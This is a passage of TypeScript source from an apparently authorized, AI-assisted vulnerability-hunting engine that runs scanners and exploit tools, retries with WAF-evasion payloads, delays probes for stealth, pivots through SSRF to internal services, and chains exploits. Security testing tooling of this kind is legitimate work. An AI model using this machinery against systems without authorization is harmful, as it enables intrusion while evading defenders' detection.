                reasoning: `Target (${host}) stopped accepting connections (${code}) immediately after this endpoint was probed. On a loopback target this cannot be a network-level IP ban — it indicates the local server process crashed or was killed, which is itself a candidate unauthenticated service-disruption vulnerability. Requires manual confirmation once the target is restarted; recent probes leading up to the crash: ${JSON.stringify(recentProbes)}.`,
                confidence: 0.4,
                priority: 9,
                evidence: [],
                status: 'pending',
                createdAt: Date.now(),
              });
              // Deliberately do NOT set hardBanned or otherwise stop the hunt here.
              // A local dev-server crash is recoverable — an external supervisor
              // (server/scripts/kali-web-ide-supervisor.ts) restarts it independently
              // of this engine. If the hunt stopped the moment it saw the crash, the
              // supervisor's restart would have nothing left to resume: the finding
              // would be captured but the recall run would still be dead. Subsequent
              // probes will simply keep failing (harmlessly) until the target answers
              // again, at which point the hunt continues as normal. banCheckDone above
              // already prevents this branch from firing more than once per hunt.
              logger.warn('[HunterEngine] Loopback target became unreachable — recorded as candidate finding, continuing hunt (target expected to be restarted externally)', { code, target: host });
              continue;
            }
            this.hardBanned = true;
            this.emit('hunt:hard_banned', { target: host || hypothesis.targetUrl, reason: `IP hard-banned (network drop: ${code})` });
            logger.warn('[HunterEngine] Network-level block detected — terminating hunt early', { code, target: host });
            break;
          }
        }
      }

      if (this.hardBanned) break;
    }
  }

  // ── Phase 4: Update ─────────────────────────────────────────────────────────
  private async update(): Promise<void> {
    logger.info("UPDATE phase", { session: this.state.sessionId });

    for (const hypothesis of this.state.hypotheses.filter(h => h.status === "probing")) {
      const relatedProbes = this.state.probes.filter(p => p.hypothesisId === hypothesis.id);
      const successful = relatedProbes.filter(p => p.success);

      if (successful.length > 0) {
        // Weighted blend of prior confidence and probe success rate (no model call)
        const newConfidence = await this.updateConfidence(hypothesis, successful);
        hypothesis.confidence = newConfidence;

        if (newConfidence > 0.7) {
          hypothesis.status = "confirmed";
          hypothesis.reasoning = describeFromProbe(hypothesis, successful[0]);
          this.rlWiring.onHypothesisOutcome(hypothesis.vulnClass, hypothesis.confidence, true);
          this.rlWiring.recordModelOutcome(hypothesis.modelSource ?? "default", hypothesis.vulnClass, true);
          if (hypothesis.retryTechnique) {
            const rt = hypothesis.retryTechnique;
            this.rlWiring.onRetryTechniqueOutcome(rt.reason, rt.axisKey, hypothesis.vulnClass, rt.technique, true);
          }
          // Credit the chain synthesis if this hypothesis was born from one.
          // Without this, the RL only sees the closing tool and never learns that
          // the synthesis pass that found the opening was the load-bearing step.
          if (hypothesis.chainedFrom?.length) {
            this.rlWiring.onToolResult("chain_synthesis", hypothesis.vulnClass, true, hypothesis.confidence);
            this.emit("hunt:chain_credited", {
              hypothesisId: hypothesis.id,
              vulnClass: hypothesis.vulnClass,
              parentFindingIds: hypothesis.chainedFrom,
            });
          }
          const confirmed = await this.buildConfirmedFinding(hypothesis, successful);
          this.state.confirmedFindings.push(confirmed);
          this.emit("hunt:finding_confirmed", { finding: confirmed });
          const dbFindingId = await this.persistFinding(confirmed);
          // dbId lets CampaignOrchestrator's Layer 5 verification gate retract
          // this entry later via contextWriter.retractFinding() if its more
          // rigorous 4-layer check overturns this fast-path confirmation.
          contextWriter.addFinding({
            id: confirmed.hypothesis.id,
            dbId: dbFindingId,
            vulnClass: confirmed.hypothesis.vulnClass,
            severity: confirmed.severity,
            confidence: confirmed.hypothesis.confidence,
            endpoint: confirmed.hypothesis.targetUrl,
            payload: confirmed.exploitPayload,
            description: confirmed.hypothesis.reasoning.slice(0, 300),
            confirmedAt: new Date().toISOString(),
          });
          contextWriter.alert("finding", {
            vulnClass: confirmed.hypothesis.vulnClass,
            severity: confirmed.severity,
            endpoint: confirmed.hypothesis.targetUrl,
            confidence: confirmed.hypothesis.confidence,
          });

          // Non-blocking: demonstrate impact scope for the report without
          // holding up the hunt loop. Failures are fully isolated.
          (async () => {
            try {
              const assessment = await postExploitAgent.demonstrate(
                {
                  findingId: confirmed.hypothesis.id,
                  vulnClass: confirmed.hypothesis.vulnClass,
                  targetUrl: confirmed.hypothesis.targetUrl,
                  programId: this.state.programId,
                  exploitPayload: confirmed.exploitPayload,
                  confidence: confirmed.hypothesis.confidence,
                  authHeaders: this.authHeaders,
                  capturedBody: confirmed.proof.find(p => p.success)?.output ?? confirmed.proof[0]?.output,
                  rawHttpLog: confirmed.rawEvidence,
                },
                confirmed.severity,
                confirmed.cvssScore,
              );
              if (assessment.impactProven && dbFindingId > 0) {
                this.emit("hunt:impact_demonstrated", {
                  sessionId: this.state.sessionId,
                  findingId: confirmed.hypothesis.id,
                  vulnClass: confirmed.hypothesis.vulnClass,
                  severity: assessment.severity,
                  cvssScore: assessment.cvssScore,
                  steps: assessment.steps.length,
                });
                // Do NOT apply the severity/CVSS bump now — the finding is still
                // unverified at this point (Path B verifies at hunt:complete, Path A
                // at orchestrator L5). Stash the proven escalation in the evidence
                // trail; it is applied only once the verifier returns "confirmed",
                // so we never inflate severity on a finding the verifier rejects.
                try {
                  const [row] = await db.select({ evidence: findings.evidence })
                    .from(findings).where(eq(findings.id, dbFindingId)).limit(1);
                  const ev = Array.isArray(row?.evidence)
                    ? row!.evidence as Record<string, unknown>[]
                    : [];
                  ev.push({
                    type: "impact_escalation",
                    severity: assessment.severity,
                    cvssScore: assessment.cvssScore,
                    impact: assessment.businessImpact,
                    proven: true,
                  });
                  await db.update(findings)
                    .set({ evidence: ev as unknown as Record<string, unknown>[], updatedAt: new Date() })
                    .where(eq(findings.id, dbFindingId));
                } catch (e) {
                  logger.debug("[HunterEngine] Failed to stash impact escalation", { err: String(e) });
                }
              }
            } catch (err) {
              logger.debug("[HunterEngine] Post-exploit demonstration non-critical failure", { err: String(err) });
            }
          })();

          notificationService.notifyIfWorthy({
            type: "finding_confirmed",
            severity: confirmed.severity,
            vulnType: confirmed.hypothesis.vulnClass,
            targetUrl: confirmed.hypothesis.targetUrl,
            cvssScore: confirmed.cvssScore,
            detail: confirmed.hypothesis.reasoning.slice(0, 200),
          }).catch(() => {});

          // SSRF chain pivot — after SSRF confirmed, probe internal services
          if (hypothesis.vulnClass === "ssrf") {
            (async () => {
              try {
                const ssrfParam = ssrfChainProber.detectSSRFParam(hypothesis.targetUrl);
                const pivot = await ssrfChainProber.probe(hypothesis.targetUrl, ssrfParam, this.authHeaders, this.state.programId);
                for (const ph of pivot.pivotHypotheses) {
                  this.state.hypotheses.push({
                    id: uuidv4(), vulnClass: ph.vulnClass, targetUrl: hypothesis.targetUrl,
                    reasoning: ph.reasoning, confidence: ph.confidence, priority: ph.priority,
                    evidence: [], status: "pending", createdAt: Date.now(),
                  });
                }
                if (pivot.reachableEndpoints.length > 0) {
                  this.emit("hunt:ssrf_pivot", {
                    sessionId: this.state.sessionId,
                    reachable: pivot.reachableEndpoints,
                    cloudMeta: !!pivot.cloudMetadata,
                    newHypotheses: pivot.pivotHypotheses.length,
                  });
                }
              } catch (err) {
                logger.debug("[HunterEngine] SSRF pivot non-critical", { err: String(err) });
              }
            })();
          }
          // Exploit chain seeding — if this vuln matches a chain step, seed next steps
          for (const [chainId, chain] of Object.entries(ATTACK_TREES)) {
            const matchingStep = chain.steps.find(s => s.vulnClass === hypothesis.vulnClass);
            if (!matchingStep) continue;
            const nextStep = chain.steps.find(s => s.stepNumber === matchingStep.stepNumber + 1);
            if (!nextStep) continue;
            this.state.hypotheses.push({
              // Inherit the parent's actual exploited endpoint+query (not the bare
              // this.state.targetUrl) — otherwise the probe, persisted affectedUrl,
              // and VerifierAgent's L2 reprobe all hit the homepage instead of the
              // real injectable URL, so chain-seeded findings can never verify.
              id: uuidv4(), vulnClass: nextStep.vulnClass, targetUrl: hypothesis.targetUrl,
              reasoning: `Exploit chain [${chain.name}] step ${nextStep.stepNumber}: ${nextStep.description}`,
              confidence: 0.65, priority: 9,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
            this.emit("hunt:chain_seeded", { sessionId: this.state.sessionId, chainId, chainName: chain.name, step: nextStep.stepNumber, vulnClass: nextStep.vulnClass });
            logger.info("[HunterEngine] Chain continuation seeded", { chainId, step: nextStep.stepNumber });
          }

        } else if (newConfidence < 0.2) {
          hypothesis.status = "rejected";
          this.rlWiring.onHypothesisOutcome(hypothesis.vulnClass, hypothesis.confidence, false);
          this.rlWiring.recordModelOutcome(hypothesis.modelSource ?? "default", hypothesis.vulnClass, false);
          if (hypothesis.retryTechnique) {
            const rt = hypothesis.retryTechnique;
            this.rlWiring.onRetryTechniqueOutcome(rt.reason, rt.axisKey, hypothesis.vulnClass, rt.technique, false);
          }
        } else {
          // Gray zone (0.2–0.7): re-queue, up to 2 retries. WHICH knob turns
          // (tool vs payload) is decided by classifying why the last attempt
          // failed, instead of both firing unconditionally on every retry —
          // a wrong-payload signal no longer wastes the one retry swapping to
          // an unrelated tool, and vice versa.
          hypothesis.retryCount = (hypothesis.retryCount || 0) + 1;
          if (hypothesis.retryCount < 2) {
            hypothesis.status = "pending";
            const lastProbe = successful[successful.length - 1];
            const reason = classifyRetryFailure(lastProbe?.payload ?? "", lastProbe?.output ?? "");
            hypothesis.lastFailureReason = reason;
            // Clear any retryTechnique from a PRIOR retry cycle — this
            // cycle's classification may differ (e.g. this time landed on
            // not_injectable, which never sets retryTechnique in probe()),
            // and a stale value here would misattribute whatever outcome
            // follows to the wrong technique.
            delete hypothesis.retryTechnique;
            if (reason === "not_injectable") {
              // Endpoint-local: a different payload dialect won't help a
              // dead param/endpoint — swap the tool/injection point instead.
              // Already hard-capped to exactly this one swap by retryCount<2
              // above, so this can't cycle tools against the budget.
              hypothesis.toolHint = this.getAlternateTool(hypothesis);
            }
            // Else (waf_blocked/reflected_not_executed/no_signal): leave
            // toolHint unset — probe()'s retry branch mutates the payload
            // on the SAME tool instead, routed by this same reason.
            logger.info("Hypothesis re-queued from gray zone", {
              id: hypothesis.id,
              vulnClass: hypothesis.vulnClass,
              confidence: newConfidence,
              retry: hypothesis.retryCount,
              reason,
              nextTool: hypothesis.toolHint,
            });
          } else {
            hypothesis.status = "inconclusive"; // exhausted retries
            // Retries ran out without a decisive confirm/reject — an
            // ambiguous outcome, never recorded as a win or a loss.
            delete hypothesis.retryTechnique;
          }
        }
      } else {
        if (relatedProbes.length > 0) {
          hypothesis.status = "rejected";
          this.rlWiring.onHypothesisOutcome(hypothesis.vulnClass, hypothesis.confidence, false);
          this.rlWiring.recordModelOutcome(hypothesis.modelSource ?? "default", hypothesis.vulnClass, false);
          // Record miss in ROI model so success rates decay appropriately
          this.roiModel.updateSuccessRate(hypothesis.vulnClass, false).catch(() => {});
          if (hypothesis.retryTechnique) {
            const rt = hypothesis.retryTechnique;
            this.rlWiring.onRetryTechniqueOutcome(rt.reason, rt.axisKey, hypothesis.vulnClass, rt.technique, false);
          }
        } else {
          hypothesis.status = "pending";
        }
      }
    }

    // Cross-finding synthesis — ask Claude what chained attack is now possible
    // given all confirmed findings in combination. Async, non-blocking.
    if (this.state.confirmedFindings.length >= 2) {
      this.synthesizeChainedAttack().catch(() => {});
    }

    const pending = this.state.hypotheses.filter(h => h.status === "pending").length;
    const rejected = this.state.hypotheses.filter(h => h.status === "rejected").length;
    const deferred = this.state.hypotheses.filter(h => h.status === "deferred").length;
    this.emit("hunt:update", {
      confirmed: this.state.confirmedFindings.length,
      pendingHypotheses: pending,
      rejectedHypotheses: rejected,
      deferredHypotheses: deferred, // never probed — distinct from rejected (tested, negative)
    });

    if (this.campaignId) {
      db.update(campaigns).set({
        progress: {
          requestsMade: this.state.budget.requestsMade,
          elapsed: Math.round(this.state.budget.elapsed),
        },
      }).where(eq(campaigns.id, this.campaignId)).catch(() => {});
    }
    this.emit("hunt:ai_reasoning", {
      sessionId: this.state.sessionId,
      task: "Strategy Update",
      phase: "decision",
      summary: `Iteration ${this.state.iteration} complete. Confirmed: ${this.state.confirmedFindings.length}, Pending: ${pending}, Rejected: ${rejected}.`,
    });

    // Cross-finding synthesis — runs after first confirmed finding
    await this.runSynthesis();
  }

  private async runSynthesis(): Promise<void> {
    if (this.state.confirmedFindings.length < 1) return;
    try {
      const discoveredUrls = this.state.observations
        .map(o => (o as unknown as Record<string, unknown>).url as string)
        .filter(Boolean);
      const testedClasses = [...new Set(this.state.hypotheses.map(h => h.vulnClass))];
      const chains = await synthesisAgent.synthesize(
        this.state.sessionId,
        this.state.confirmedFindings,
        discoveredUrls,
        testedClasses,
      );
      if (chains.length > 0) {
        const deduped = chains.filter(c =>
          !this.state.hypotheses.some(
            h => h.vulnClass === c.vulnClass && h.targetUrl === c.targetUrl
          )
        );
        if (deduped.length > 0) {
          this.state.hypotheses.push(...deduped as unknown as Hypothesis[]);
          this.emit("hunt:chain_hypotheses", {
            sessionId: this.state.sessionId,
            count: deduped.length,
            chains: deduped.map(c => ({ vulnClass: c.vulnClass, chainedFrom: c.chainedFrom })),
          });
        }
      }
    } catch (err) {
      logger.debug("[HunterEngine] Synthesis skipped (non-fatal)", { err: String(err) });
    }
  }

  // ─── Helpers ─────────────────────────────────────────────────────────────────
  private async runTool(
    toolName: string,
    url: string,
    hypothesis?: Hypothesis
  ): Promise<Record<string, unknown>> {
    const tool = this.mergedTools[toolName];
    if (!tool) return { error: "Unknown tool" };

    // Rate limiting
    const lastUsed = this.toolLastUsed.get(toolName) || 0;
    const waitTime = (tool.rateLimit * 1000) - (Date.now() - lastUsed);
    if (waitTime > 0) await new Promise(r => setTimeout(r, Math.min(waitTime, 5000)));

    // Skip if target is known hard-banned — avoid wasting tool budget on blocked requests
    try {
      const hostname = new URL(url).hostname;
      if (dynamicRateLimiter.isHardBanned(hostname)) {
        return { hardBanned: true, duration: 0, command: '' };
      }
    } catch { /* non-critical — URL may not be parseable */ }

    // Decay-aware timing: honour stealth coordinator recommendation before probing
    try {
      const domain = new URL(url).hostname;
      const vendor = (this.state as unknown as Record<string, string>).detectedWafVendor ?? 'generic';
      const status = stealthCoordinator.getStatus(this.state.sessionId, domain, vendor);
      const decayState = temporalDecay.getDecayState(this.state.sessionId, domain, vendor);
      if (decayState.recommendedWaitMs > 0) {
        logger.debug('[HunterEngine] stealth timing delay', { status, waitMs: decayState.recommendedWaitMs });
        await new Promise(r => setTimeout(r, Math.min(decayState.recommendedWaitMs, 30_000)));
      }
    } catch { /* non-critical — URL may not be parseable */ }

    const { bin, args } = tool.command(url, hypothesis ? { severity: "medium,high,critical" } : undefined);

    // Nuclei template rotation — inject previously generated custom templates
    if (toolName === "nuclei") {
      try {
        const domain = new URL(url).hostname;
        const saved = await db.select({ nucleiTemplate: findings.nucleiTemplate })
          .from(findings)
          .where(isNotNull(findings.nucleiTemplate))
          .orderBy(desc(findings.createdAt))
          .limit(10);
        const templates = saved.map(r => r.nucleiTemplate).filter(Boolean) as string[];
        if (templates.length > 0) {
          const tmplPath = join(tmpdir(), `netty-custom-${domain.replace(/\./g, "-")}-${Date.now()}.yaml`);
          await writeFile(tmplPath, templates.join("\n---\n"), "utf8");
          args.push("-t", tmplPath); // -t restricts nuclei to these custom templates
        } else {
          // No custom templates → bound the default store by the hypothesis vuln
          // class so nuclei runs a small relevant subset instead of the full set
          // (which always hits the 60s tool ceiling). Skip if -tags already present.
          if (!args.includes("-tags")) {
            const tags = NUCLEI_TAGS_BY_CLASS[hypothesis?.vulnClass ?? ""] ?? NUCLEI_TAGS_FALLBACK;
            args.push("-tags", tags);
          }
        }
      } catch { /* non-critical — continue without custom templates */ }
    }

    // Inject auth headers so tools probe authenticated surfaces
    if (this.authHeaders && Object.keys(this.authHeaders).length > 0) {
      args.push(...this.buildAuthArgs(toolName, this.authHeaders));
    }
    const cmdString = `${bin} ${args.join(" ")}`;
    const start = Date.now();

    // Route through proxychains4 when proxy is enabled and the tool supports it
    const useProxy = this.state.proxyEnabled
      && (toolRunner.getToolConfig(toolName)?.proxySupport ?? false);
    const execBin = useProxy ? 'proxychains4' : bin;
    const execArgs = useProxy ? ['-q', bin, ...args] : args;

    try {
      const { stdout, stderr } = await execFileAsync(execBin, execArgs, { timeout: 60000 });
      this.toolLastUsed.set(toolName, Date.now());
      const parsed = tool.parser(stdout + stderr);
      // Feed raw output to autonomous brain — fire-and-forget so AI latency never blocks probing
      import('../lib/intelligence').then(({ getAutonomousBrain }) => {
        const brain = getAutonomousBrain();
        brain.processObservation({
          id: `obs-${Date.now()}`,
          timestamp: new Date().toISOString(),
          source: 'tool',
          type: toolName,
          rawOutput: stdout + stderr,
          missionId: this.state.sessionId,
          huntGoal: hypothesis?.vulnClass,
          target: url,
        }).then(() => {
          brain.recordActionResult(this.state.sessionId, toolName, true, `tool succeeded: ${parsed.found ? 'finding' : 'no finding'}`);
        }).catch(() => {});
      }).catch(() => {});
      return { ...parsed, duration: Date.now() - start, command: cmdString };
    } catch (err: unknown) {
      const error = err as { killed?: boolean; code?: string; stdout?: string; stderr?: string; message?: string };
      // ENOENT (binary not installed) was previously indistinguishable from a real
      // timeout — both silently returned {timeout: true} with zero logging. Surface
      // the missing-binary case loudly and distinctly so it doesn't read as "tool ran
      // and found nothing" or "tool was just slow."
      const toolMissing = error.code === 'ENOENT';
      try {
        const { getAutonomousBrain } = await import('../lib/intelligence');
        getAutonomousBrain().recordActionResult(this.state.sessionId, toolName, false,
          toolMissing ? 'tool not installed' : (error.killed ? 'timeout' : (error.message || 'unknown error')));
      } catch { /* non-critical */ }
      if (toolMissing) {
        logger.warn(`[HunterEngine] Tool "${toolName}" (${bin}) is not installed — probe skipped, not a timeout`, { toolName, bin });
      }
      const timedOut = error.killed === true;
      const partialOutput = (error.stdout || '') + (error.stderr || '');
      this.toolLastUsed.set(toolName, Date.now());
      if (partialOutput.trim()) {
        return { ...tool.parser(partialOutput), timedOut, toolMissing, duration: Date.now() - start, command: cmdString };
      }
      return { timeout: true, timedOut, toolMissing, duration: Date.now() - start, command: cmdString };
    }
  }

  private selectTool(vulnClass: string): string {
    const vulnToolMap: Record<string, string> = {
      xss: "dalfox",
      sqli: "sqlmap",
      // ssrfmap's real CLI requires -r (a raw captured HTTP request file) and -p
      // <param name> — it has no -u/-H flags at all. The old command here passed
      // -u/-p url/-H, none of which the binary recognizes, so it always errored
      // immediately and printed its own usage banner (ASCII art containing the
      // literal word "SSRFMap"). The parser's /ssrf/i regex then matched that
      // banner text, so ssrfmap was a guaranteed false-positive generator for
      // every SSRF hypothesis it was ever selected for. nuclei is tag-scoped to
      // real "ssrf" templates and the OOB beacon probe (runOOBProbe) already
      // gives a genuine, unforgeable confirmation path for SSRF.
      ssrf: "nuclei",
      lfi: "nuclei",
      rce: "nuclei",
      ssti: "tplmap",
      auth_bypass: "jwt_tool",
      http_smuggling: "smuggler",
      // curl_probe discards the response body (-o /dev/null) and only analyzes
      // headers — it cannot see an IDOR's actual object-ownership leak, which
      // lives in the body. nuclei is tag-scoped to "idor" templates and parses
      // real match output (see NUCLEI_TAGS_BY_CLASS / parseNucleiOutput).
      idor: "nuclei",
      misconfig: "nikto",
      hidden_endpoints: "ffuf",
      exposed_panels: "gobuster",
      security_headers: "curl_probe",
      tech_stack: "whatweb",
      open_redirect: "nuclei",
      cors: "corsy",
      nosqli: "nosqlmap",
      csrf: "curl_probe",
      info_disclosure: "curl_probe",
      xxe: "nuclei",
      race_condition: "nuclei",
      prototype_pollution: "nuclei",
      cloud_storage_exposure: "nuclei",
      // jwt_tool only tests JWT-specific auth flaws; broken_auth hypotheses from
      // websocket-probe.ts/js-spa-crawler.ts are general session/auth issues that
      // may have nothing to do with JWTs, so jwt_tool's verdict is irrelevant
      // evidence for them regardless of naming. nuclei is tag-scoped to
      // "default-login,auth-bypass" templates (see NUCLEI_TAGS_BY_CLASS) instead.
      broken_auth: "nuclei",
      websocket: "nuclei",
      host_header_injection: "curl_probe",
      crlf_injection: "curl_probe",
      cookie_flags: "curl_probe",
      oauth_misconfiguration: "nuclei",
      mass_assignment: "nuclei",
      business_logic: "nuclei",
      two_factor_bypass: "nuclei",
      jwt_confusion: "jwt_tool",
      parameter_injection: "nuclei",
      hidden_params: "ffuf",
    };
    return vulnToolMap[vulnClass] || "nuclei";
  }

  // Candidate tool sets per vuln class — the realistic options the engine can
  // pick among. Used by selectToolRL to let learned success rates choose the
  // best performer rather than always firing the hardcoded default.
  // Candidates beyond the original tool are catalog tools (server/src/lib/hunter/
  // kali-catalog.ts) that are only registered into mergedTools when checkBinarySync
  // actually finds the binary installed — so these entries are harmless no-ops on a
  // box that doesn't have them (runTool returns {error:"Unknown tool"}, scored as a
  // plain non-finding) and real added diversity on a box that does.
  //
  // A candidate is only safe to add here if the tool's own `vulnClasses` entry in
  // TOOL_KNOWLEDGE/kali-catalog literally includes the vuln class — that list gates
  // probe success (see `toolSupportsClass` in probe()), so a tool whose declared
  // classes don't cover this entry can never register a real finding for it and is
  // dead weight at best. It is NOT safe to add nuclei as a candidate for a class
  // outside NUCLEI_TAGS_BY_CLASS: without real tag scoping it falls back to
  // "-tags misconfig" (see runTool), and any genuine misconfig-template match would
  // then get credited as evidence for an unrelated vuln class — the exact
  // irrelevant-tool-signal bug already fixed once for curl_probe (see the
  // toolSupportsClass comment in probe()). Several vuln classes below (e.g.
  // business_logic, websocket, parameter_injection) default to nuclei or
  // curl_probe in selectTool() but neither tool's declared vulnClasses covers
  // them — those hypotheses can only ever be confirmed via a dedicated
  // prober/LogicExploitAgent path or an OOB hit, never via the generic tool-
  // select path, and were deliberately left out of TOOL_CANDIDATES here
  // rather than paired with an unverifiable tool.
  // race_condition, host_header_injection, oauth_misconfiguration,
  // mass_assignment, prototype_pollution, and cloud_storage_exposure used to
  // be in that same bucket but are now handled upstream: their evidence
  // sources (race_condition_detector, host_header_probe, oauth_probe,
  // mass_assignment_probe, prototype_pollution_probe, cloud_bucket_probe) are
  // in SELF_CONFIRMED_SOURCES above probe()'s tool dispatch, so a hypothesis
  // from any of them never reaches selectTool() at all — the entries below still
  // exist purely as the retry-hint default for the rare case a hypothesis of
  // that class arrives from some other source.
  private static readonly TOOL_CANDIDATES: Record<string, string[]> = {
    sqli:             ["sqlmap", "nuclei", "curl_probe"],
    xss:              ["dalfox", "xsstrike", "nuclei", "curl_probe"],
    ssrf:             ["nuclei", "curl_probe"],
    lfi:              ["nuclei", "curl_probe"],
    rce:              ["nuclei", "curl_probe"],
    cors:             ["corsy", "curl_probe", "nuclei"],
    nosqli:           ["nosqlmap", "nuclei"],
    csrf:             ["curl_probe", "nuclei"],
    idor:             ["nuclei", "arjun"],
    info_disclosure:  ["curl_probe", "nuclei"],
    auth_bypass:      ["jwt_tool", "nuclei", "curl_probe", "nomore403"],
    misconfig:        ["nikto", "nuclei"],
    xxe:              ["nuclei", "curl_probe"],
    security_headers: ["curl_probe", "nuclei"],
    open_redirect:    ["nuclei", "curl_probe", "crlfuzz"],
    hidden_endpoints: ["ffuf", "gobuster", "feroxbuster", "wfuzz"],
    hidden_params:    ["ffuf", "arjun"],
    crlf_injection:   ["curl_probe", "crlfuzz"],
    // Both gobuster and nuclei declare "exposed_panels" in their TOOL_KNOWLEDGE
    // vulnClasses list (nuclei via real -tags "panel,exposure" scoping), so this
    // is genuine diversity, not a gate-blocked no-op.
    exposed_panels:   ["gobuster", "nuclei"],
    // nuclei declares "broken_auth" and is tag-scoped for it
    // ("default-login,auth-bypass" in NUCLEI_TAGS_BY_CLASS) — real evidence, not
    // the misconfig fallback. jwt_tool is deliberately excluded: it only tests
    // JWT-specific auth flaws, and broken_auth hypotheses from
    // websocket-probe.ts/js-spa-crawler.ts are general session/auth issues that
    // may have nothing to do with JWTs (see the selectTool() comment for
    // broken_auth) — reusing it here would reintroduce that same irrelevant-signal
    // bug for a different tool.
    broken_auth:      ["nuclei", "curl_probe"],
  };

  /**
   * RL-aware tool selection. Consults learned per-(tool,vulnClass) success rates
   * to pick the best candidate, falling back to the hardcoded selectTool default
   * on cold start or when no candidate clearly beats it.
   */
  private async selectToolRL(vulnClass: string): Promise<string> {
    const fallback = this.selectTool(vulnClass);
    const candidates = HunterEngine.TOOL_CANDIDATES[vulnClass];
    if (!candidates || candidates.length <= 1) return fallback;
    return this.rlWiring.getBestTool(candidates, vulnClass, fallback);
  }

  private getAlternateTool(hypothesis: Hypothesis): string {
    // Reuses TOOL_CANDIDATES (see comment above that table for what makes a
    // candidate safe to add) instead of keeping a second, independently-maintained
    // rotation list — the two had drifted out of sync before (auth_bypass's jwt_tool
    // entry, for one) since nothing enforced they stay identical.
    const rotation = HunterEngine.TOOL_CANDIDATES[hypothesis.vulnClass] || ["nuclei", "curl_probe"];
    const currentTool = this.selectTool(hypothesis.vulnClass);
    const currentIdx = rotation.indexOf(currentTool);
    // currentTool may not appear in rotation (e.g. its class has no TOOL_CANDIDATES
    // entry and falls back to ["nuclei","curl_probe"] here while selectTool()
    // returns some other default) — indexOf returns -1, and (-1+1)%len === 0 lands
    // on rotation[0], the safe starting point rather than an out-of-bounds/negative index.
    return rotation[(currentIdx + 1) % rotation.length];
  }

  // Vendor-specific WAF evasion (EvasionLibrary/WAFDetector, WAFBypass.ts) is
  // an authorized capability gated by wafBypassEnabled + programs.wafBypassPolicy
  // — that gate is enforced once, in OBSERVE's waf_intel step (see observe()).
  // This retry path must NOT re-derive its own authorization: it only reads
  // the already-gated waf_intel observation. If that observation isn't there
  // (wafBypassEnabled was off, or policy disallowed it and OBSERVE degraded
  // to detectionConfidence:0 with no vendor), there is no authorized vendor
  // intel to use — return null and let the caller fall through to the
  // generic (ungated) mutation path. One honest branch, not two.
  //
  // The winning technique here is recorded keyed by (vendor, vulnClass,
  // technique) — NOT by app stack. WAF-evasion effectiveness transfers by
  // WHICH WAF VENDOR is in front of the target, not by what the origin app
  // is written in; keying it by stack would silently misattribute a
  // Cloudflare bypass to "works for PHP" when the PHP app just happened to
  // sit behind Cloudflare that day. See the caller (probe()'s retry branch)
  // for where that record actually happens, once the retry's outcome is known.
  private async pickWafEvasionPayload(
    vulnClass: string, targetUrl: string
  ): Promise<{ payload: string; vendor: string; technique: string } | null> {
    if (!this.state.wafBypassEnabled) return null;
    const wafObs = this.state.observations.find(o => o.source === "waf_intel");
    if (!wafObs) return null;
    const intel = wafObs.data as unknown as UnifiedIntelligence;
    if (!intel.vendor || intel.vendor === "unknown") return null;

    // Re-verify authorization FRESH, through the exact same gate
    // WAFBypass.ts's synthesize() itself uses — not a re-implementation of
    // it. wafBypassEnabled above is only the per-hunt opt-in; it says
    // nothing about the program's own wafBypassPolicy, which is checked
    // here. A hunt can run for hours between OBSERVE's detection (which
    // produced the vendor/technique data below) and a much later gray-zone
    // retry — trusting that snapshot for something this consequential,
    // rather than re-checking, would let a policy change mid-hunt go
    // unnoticed. This does NOT re-run detection (cheap: no HTTP to the
    // target), just the authorization check.
    const auth = await checkWafBypassAuthorization(targetUrl, this.state.programId);
    if (!auth.allowed) return null;

    // Seed from the CORRECT base payload for the vulnClass actually being
    // retried — never reuse a recommendedTechniques payload string verbatim.
    // OBSERVE's WAF fingerprint probe always tests with a single hardcoded
    // XSS payload ("<script>alert(1)</script>", see observe()'s waf_intel
    // step), so every entry in recommendedTechniques is an XSS-shaped
    // mutation. Returning one of those payloads directly for e.g. a sqli or
    // lfi retry would inject an unrelated vulnerability's payload — not a
    // wrong-flavor mutation, a different bug's payload entirely.
    const basePayload = payloadMutator.getBase(vulnClass)[0];
    if (!basePayload) return null;
    const evasion = new EvasionLibrary();

    // The TECHNIQUE NAME does transfer across vulnClasses even though the
    // PAYLOAD doesn't — "unicode_bypass"/"url_encoding" are generic string-
    // obfuscation tricks, not XSS-specific. Prefer whichever technique
    // OBSERVE already fired for real and confirmed worked against THIS
    // target's WAF, applied fresh to the right base payload — stronger
    // evidence than a blind vendor-generic recommendation, since it's
    // already proven to bypass this specific WAF instance.
    const proven = (intel.recommendedTechniques || [])
      .filter(t => t.success)
      .sort((a, b) => a.blockRate - b.blockRate)[0];
    if (proven) {
      const variant = evasion.generateVariants(basePayload, [proven.technique])[0];
      if (variant) return { payload: variant.payload, vendor: intel.vendor, technique: variant.technique };
    }

    // No already-tested success on record — fall back to a fresh vendor-
    // recommended variant instead.
    const variant = evasion.generateVariants(basePayload, evasion.recommendTechniques(intel.vendor))[0];
    return variant ? { payload: variant.payload, vendor: intel.vendor, technique: variant.technique } : null;
  }

  // The app-stack analog of the vendor detection above — same whatweb
  // observation techPayloadSelector already reads, just reduced to a single
  // stable, order-independent key so "Express, Node" and "Node, Express"
  // don't split into two separate learning cells for the same stack.
  // Returns null when nothing was fingerprinted, so callers can skip
  // recording rather than writing a meaningless "unknown" axis value.
  private getDetectedStackKey(): string | null {
    const techObs = this.state.observations.find(o => o.source === "whatweb");
    const rawTechs = (techObs?.data as { technologies?: unknown } | undefined)?.technologies;
    const techs: string[] = [];
    if (Array.isArray(rawTechs)) {
      for (const entry of rawTechs) {
        if (typeof entry === "object" && entry !== null) techs.push(...Object.keys(entry as Record<string, unknown>));
      }
    }
    if (techs.length === 0) return null;
    return [...new Set(techs.map(t => t.toLowerCase()))].sort().join("+");
  }

  private buildAuthArgs(toolName: string, headers: Record<string, string>): string[] {
    const args: string[] = [];
    for (const [key, value] of Object.entries(headers)) {
      switch (toolName) {
        case "nuclei":
        case "ffuf":
          args.push("-H", `${key}: ${value}`);
          break;
        case "curl_probe":
          args.push("-H", `${key}: ${value}`);
          break;
        case "sqlmap":
          if (key.toLowerCase() === "cookie") {
            args.push("--cookie", value);
          } else {
            args.push("--headers", `${key}: ${value}`);
          }
          break;
        case "whatweb":
          args.push("--header", `${key}: ${value}`);
          break;
        case "gobuster":
          args.push("-H", `${key}: ${value}`);
          break;
        case "nikto":
          if (key.toLowerCase() === "cookie") {
            args.push("-c", value);
          }
          break;
        case "corsy":
          // corsy parses --headers as JSON
          args.push("--headers", JSON.stringify({ [key]: value }));
          break;
        case "jwt_tool":
          args.push("-rh", `${key}: ${value}`);
          break;
        case "xsser":
